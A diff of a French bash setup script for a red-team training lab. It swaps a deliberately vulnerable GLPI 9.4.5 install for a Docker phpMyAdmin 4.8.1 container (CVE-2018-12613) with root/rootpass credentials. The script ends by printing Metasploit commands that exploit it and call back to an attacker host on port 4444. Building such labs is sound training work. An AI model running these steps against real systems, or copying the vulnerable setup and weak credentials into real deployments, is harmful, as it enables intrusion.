@@ -1,179 +1,154 @@
 #!/bin/bash
-#
-# Script d'installation GLPI 9.4.5 (vulnérable CVE-2020-11060) - CORRIGÉ
-# Pour lab Iron4Software - Serveur mail 192.168.1.250
-#
+
+###############################################################################
+# Iron4Software Red Team Lab - phpMyAdmin 4.8.1 Docker
+# CVE-2018-12613 - Local File Inclusion → Remote Code Execution
+# Nettoyage automatique du port 8080
+###############################################################################
 
 set -e
 
-# Couleurs
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-NC='\033[0m'
+echo "========================================================"
+echo "  Iron4Software Lab - phpMyAdmin 4.8.1 Docker"
+echo "  CVE-2018-12613 (LFI → RCE)"
+echo "========================================================"
+echo ""
 
-echo -e "${GREEN}================================================${NC}"
-echo -e "${GREEN}Installation GLPI 9.4.5 (Vulnérable CVE-2020-11060)${NC}"
-echo -e "${GREEN}================================================${NC}"
+PORT=8080
 
-# Configuration
-GLPI_VERSION="9.4.5"
-GLPI_URL="https://github.com/glpi-project/glpi/releases/download/${GLPI_VERSION}/glpi-${GLPI_VERSION}.tgz"
-GLPI_DIR="/var/www/html/glpi"
-GLPI_DB="glpi_db"
-GLPI_USER="glpi_user"
-GLPI_PASS="GlpiPass2024!"
-MYSQL_ROOT_PASS=""
-
-# Demander le mot de passe MySQL root
-read -sp "Mot de passe MySQL root : " MYSQL_ROOT_PASS
-echo
-
-echo -e "\n${YELLOW}[1/9] Nettoyage des dépendances cassées...${NC}"
-apt --fix-broken install -y
-apt-get clean
-apt-get update
-
-echo -e "\n${YELLOW}[2/9] Installation des dépendances PHP essentielles...${NC}"
-# Installer les paquets de base d'abord
-apt-get install -y \
-    php8.3 \
-    php8.3-mysql \
-    php8.3-mbstring \
-    php8.3-curl \
-    php8.3-gd \
-    php8.3-xml \
-    php8.3-zip \
-    php8.3-intl \
-    libapache2-mod-php8.3
-
-echo -e "\n${YELLOW}[3/9] Installation des extensions PHP optionnelles...${NC}"
-# Installer ce qui est disponible, ignorer les erreurs
-apt-get install -y php8.3-ldap 2>/dev/null || echo -e "${YELLOW}php8.3-ldap non disponible, ignoré${NC}"
-apt-get install -y php8.3-imap 2>/dev/null || echo -e "${YELLOW}php8.3-imap non disponible, ignoré${NC}"
-apt-get install -y php8.3-bz2 2>/dev/null || echo -e "${YELLOW}php8.3-bz2 non disponible, ignoré${NC}"
-
-# APCu - peut ne pas être disponible sur toutes les versions
-apt-get install -y php8.3-apcu 2>/dev/null || echo -e "${YELLOW}APCu non disponible, GLPI fonctionnera sans cache${NC}"
-
-# CAS et XMLRPC - souvent non disponibles avec PHP 8.3
-echo -e "${YELLOW}Note: php-cas et php-xmlrpc ne sont pas requis pour GLPI 9.4.5${NC}"
-
-# Vérifier la version PHP
-PHP_VERSION=$(php -r 'echo PHP_VERSION;')
-echo -e "${GREEN}Version PHP installée : ${PHP_VERSION}${NC}"
-
-echo -e "\n${YELLOW}[4/9] Vérification des services...${NC}"
-systemctl status apache2 --no-pager || systemctl start apache2
-systemctl status mysql --no-pager || systemctl start mysql
-
-echo -e "\n${YELLOW}[5/9] Création de la base de données GLPI (isolée)...${NC}"
-mysql -u root -p"${MYSQL_ROOT_PASS}" <<EOF
--- Créer la base de données GLPI
-CREATE DATABASE IF NOT EXISTS ${GLPI_DB} CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
-
--- Supprimer l'utilisateur s'il existe déjà
-DROP USER IF EXISTS '${GLPI_USER}'@'localhost';
-
--- Créer l'utilisateur dédié
-CREATE USER '${GLPI_USER}'@'localhost' IDENTIFIED BY '${GLPI_PASS}';
-
--- Donner tous les privilèges sur la BDD GLPI uniquement
-GRANT ALL PRIVILEGES ON ${GLPI_DB}.* TO '${GLPI_USER}'@'localhost';
-FLUSH PRIVILEGES;
-EOF
-
-echo -e "${GREEN}✓ Base de données ${GLPI_DB} créée${NC}"
-
-# Vérifier l'isolation
-echo -e "\n${YELLOW}Vérification de l'isolation des bases de données :${NC}"
-mysql -u root -p"${MYSQL_ROOT_PASS}" -e "SELECT user, host, Db FROM mysql.db WHERE Db IN ('${GLPI_DB}', 'roundcubemail');"
-
-echo -e "\n${YELLOW}[6/9] Téléchargement de GLPI ${GLPI_VERSION}...${NC}"
-cd /tmp
-# Supprimer les anciens fichiers
-rm -f glpi-${GLPI_VERSION}.tgz
-wget ${GLPI_URL}
-
-echo -e "\n${YELLOW}[7/9] Extraction et installation...${NC}"
-tar -xzf glpi-${GLPI_VERSION}.tgz
-# Backup de l'ancien si existe
-if [ -d "${GLPI_DIR}" ]; then
-    mv ${GLPI_DIR} ${GLPI_DIR}.backup.$(date +%Y%m%d_%H%M%S)
+if [ "$EUID" -ne 0 ]; then 
+    echo "❌ Ce script doit être exécuté en tant que root"
+    exit 1
 fi
-mv glpi ${GLPI_DIR}
 
-echo -e "\n${YELLOW}[8/9] Configuration des permissions...${NC}"
-chown -R www-data:www-data ${GLPI_DIR}
-find ${GLPI_DIR} -type d -exec chmod 755 {} \;
-find ${GLPI_DIR} -type f -exec chmod 644 {} \;
+echo "[1/7] Vérification de Docker..."
+if ! command -v docker &> /dev/null; then
+    echo "📦 Installation de Docker..."
+    curl -fsSL https://get.docker.com -o get-docker.sh
+    sh get-docker.sh
+    systemctl enable docker
+    systemctl start docker
+    rm get-docker.sh
+fi
 
-# Permissions spécifiques pour les répertoires critiques
-chmod -R 775 ${GLPI_DIR}/files
-chmod -R 775 ${GLPI_DIR}/config
+docker --version
+echo "✅ Docker installé"
 
-echo -e "\n${YELLOW}[9/9] Configuration Apache...${NC}"
-cat > /etc/apache2/sites-available/glpi.conf <<'APACHECONF'
-# Configuration GLPI pour lab Iron4Software
-Alias /glpi /var/www/html/glpi
+echo ""
+echo "[2/7] Nettoyage du port ${PORT}..."
 
-<Directory /var/www/html/glpi>
-    Options -Indexes +FollowSymLinks
-    AllowOverride All
-    Require all granted
+# Trouver tous les containers utilisant le port 8080
+CONTAINERS_ON_PORT=$(docker ps -a --format '{{.Names}}' --filter "publish=${PORT}" 2>/dev/null)
 
-    <IfModule mod_php8.c>
-        php_value max_execution_time 600
-        php_value memory_limit 256M
-        php_value post_max_size 50M
-        php_value upload_max_filesize 50M
-    </IfModule>
-</Directory>
+if [ -n "$CONTAINERS_ON_PORT" ]; then
+    echo "⚠️  Containers trouvés sur le port ${PORT} :"
+    echo "$CONTAINERS_ON_PORT"
+    echo ""
+    
+    for CONTAINER in $CONTAINERS_ON_PORT; do
+        echo "   🗑️  Suppression de : $CONTAINER"
+        docker stop "$CONTAINER" 2>/dev/null || true
+        docker rm "$CONTAINER" 2>/dev/null || true
+    done
+    
+    echo "✅ Port ${PORT} libéré"
+else
+    echo "✅ Port ${PORT} déjà libre"
+fi
 
-# Répertoire des fichiers GLPI (vulnérable pour pentest)
-<Directory /var/www/html/glpi/files>
-    Options +Indexes
-    AllowOverride None
-    Require all granted
-</Directory>
-APACHECONF
+echo ""
+echo "[3/7] Suppression de l'ancien phpmyadmin-vuln (si existant)..."
+docker stop phpmyadmin-vuln 2>/dev/null || true
+docker rm phpmyadmin-vuln 2>/dev/null || true
 
-# Désactiver le site par défaut si nécessaire et activer GLPI
-a2ensite glpi.conf
-a2enmod rewrite
-a2enmod php8.3
-systemctl restart apache2
+echo "[4/7] Téléchargement de l'image phpMyAdmin 4.8.1..."
+docker pull phpmyadmin/phpmyadmin:4.8.1
 
-echo -e "${GREEN}✓ Configuration Apache créée${NC}"
+echo ""
+echo "[5/7] Lancement du container phpMyAdmin 4.8.1..."
+docker run -d \
+    --name phpmyadmin-vuln \
+    --restart unless-stopped \
+    --add-host=host.docker.internal:host-gateway \
+    -e PMA_HOST="host.docker.internal" \
+    -e PMA_PORT=3306 \
+    -e PMA_USER=root \
+    -e PMA_PASSWORD=rootpass \
+    -p ${PORT}:80 \
+    phpmyadmin/phpmyadmin:4.8.1
 
-# Récupérer l'IP du serveur
+if [ $? -eq 0 ]; then
+    echo "✅ phpMyAdmin 4.8.1 lancé"
+else
+    echo "❌ Erreur lors du lancement"
+    exit 1
+fi
+
+echo ""
+echo "[6/7] Attente du démarrage (15 secondes)..."
+sleep 15
+
+echo "[7/7] Vérification..."
+HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:${PORT}/ 2>/dev/null)
 SERVER_IP=$(hostname -I | awk '{print $1}')
 
-echo -e "\n${GREEN}================================================${NC}"
-echo -e "${GREEN}Installation GLPI 9.4.5 terminée !${NC}"
-echo -e "${GREEN}================================================${NC}"
-echo -e "\n${YELLOW}Informations importantes :${NC}"
-echo -e "URL d'accès      : ${GREEN}http://${SERVER_IP}/glpi${NC}"
-echo -e "Base de données  : ${GLPI_DB}"
-echo -e "Utilisateur BDD  : ${GLPI_USER}"
-echo -e "Mot de passe BDD : ${GLPI_PASS}"
-echo -e "\n${YELLOW}Étapes suivantes :${NC}"
-echo -e "1. Accéder à ${GREEN}http://${SERVER_IP}/glpi${NC}"
-echo -e "2. Suivre l'assistant d'installation :"
-echo -e "   - Langue : Français"
-echo -e "   - Licence : Accepter"
-echo -e "   - Installation : Installer"
-echo -e "   - Serveur SQL : localhost"
-echo -e "   - Utilisateur : ${GLPI_USER}"
-echo -e "   - Mot de passe : ${GLPI_PASS}"
-echo -e "   - Base : ${GLPI_DB}"
-echo -e "3. Après installation, se connecter avec :"
-echo -e "   ${GREEN}tech / tech${NC} (pour exploitation)"
-echo -e "\n${RED}⚠️  VULNÉRABILITÉ CVE-2020-11060${NC}"
-echo -e "${RED}Cette version est volontairement vulnérable${NC}"
-echo -e "\n${YELLOW}Vérification des bases de données :${NC}"
-mysql -u root -p"${MYSQL_ROOT_PASS}" -e "SHOW DATABASES;" | grep -E "(glpi|roundcube)"
+echo ""
+echo "========================================================"
+echo "  ✅ Installation terminée avec succès !"
+echo "========================================================"
+echo ""
+echo "📊 Configuration :"
+echo "   Container      : phpmyadmin-vuln"
+echo "   Version        : phpMyAdmin 4.8.1 (VULNERABLE)"
+echo "   CVE            : CVE-2018-12613"
+echo "   Port           : $PORT"
+echo "   IP Serveur     : $SERVER_IP"
+echo ""
+echo "🌐 URLs d'accès :"
+echo "   Local          : http://localhost:${PORT}/"
+echo "   Réseau         : http://${SERVER_IP}:${PORT}/"
+echo ""
+echo "🔐 Credentials MySQL :"
+echo "   User: root"
+echo "   Pass: rootpass"
+echo ""
 
-echo -e "\n${GREEN}Installation terminée avec succès !${NC}"
-echo -e "${YELLOW}Suppression des fichiers temporaires...${NC}"
-rm -f /tmp/glpi-${GLPI_VERSION}.tgz
+if [ "$HTTP_CODE" = "200" ]; then
+    echo "✅ phpMyAdmin accessible (HTTP 200)"
+else
+    echo "⚠️  phpMyAdmin ne répond pas encore (HTTP $HTTP_CODE)"
+    echo "   Attendez 30 secondes et testez: curl http://localhost:${PORT}/"
+fi
+
+echo ""
+echo "🐳 Containers Docker actifs :"
+docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Ports}}\t{{.Status}}"
+
+echo ""
+echo "========================================================"
+echo "  🔥 EXPLOITATION AVEC METASPLOIT"
+echo "========================================================"
+echo ""
+echo "Depuis Kali Linux :"
+echo ""
+echo "msfconsole -q"
+echo "use exploit/multi/http/phpmyadmin_lfi_rce"
+echo "set RHOSTS ${SERVER_IP}"
+echo "set RPORT ${PORT}"
+echo "set USERNAME root"
+echo "set PASSWORD rootpass"
+echo "set LHOST 192.168.100.10"
+echo "set LPORT 4444"
+echo "check"
+echo "exploit"
+echo ""
+echo "========================================================"
+echo "  📚 Ressources"
+echo "========================================================"
+echo ""
+echo "CVE-2018-12613 : https://nvd.nist.gov/vuln/detail/CVE-2018-12613"
+echo "Exploit-DB     : https://www.exploit-db.com/exploits/44928"
+echo "MITRE ATT&CK   : T1190 (Exploit Public-Facing Application)"
+echo ""
+echo "✅ phpMyAdmin 4.8.1 vulnérable - Prêt pour exploitation !"
+echo ""
